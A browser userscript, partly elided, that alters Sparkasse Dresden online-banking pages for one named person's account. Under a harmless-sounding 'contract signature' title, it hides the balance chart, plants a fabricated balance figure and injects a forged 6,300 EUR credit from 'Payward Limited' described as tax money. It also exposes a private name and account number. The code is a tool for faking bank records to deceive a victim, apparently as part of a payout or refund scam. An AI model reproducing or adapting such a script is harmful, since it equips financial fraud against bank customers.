// ==UserScript==
// @name         Vertragssignature R Sparkasse Claudia Hauptmann
...
// @match        *://*/*
// @match        https://www.ostsaechsische-sparkasse-dresden.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.ostsaechsische-sparkasse-dresden.de/fi/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.ostsaechsische-sparkasse-dresden.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.ostsaechsische-sparkasse-dresden.de/fi/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.ostsaechsische-sparkasse-dresden.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @match        https://www.ostsaechsische-sparkasse-dresden.de/fi/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/474702/Vertragssignature%20R%20Sparkasse%20Claudia%20Hauptmann.user.js
// @updateURL https://update.greasyfork.org/scripts/474702/Vertragssignature%20R%20Sparkasse%20Claudia%20Hauptmann.meta.js
// ==/UserScript==
...
(function() {
    ...
    var buchungTextsZahl = "218.109";
    var accountsecurity = "4120 5215 97";
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("10529045730") > 0) {
...
localStorage.removeItem('refresh')
    ...
    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("10529046165") > 0) {
    ...
    saldoLinechartElement.remove();
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
           ...
           //    document.getElementsByClassName("saldo-linechart")[0].remove();
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 6.300,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Finanzamt von England für Steuern</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">6.300</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">6.300,00 EUR</span></div></div></div></div></li>';
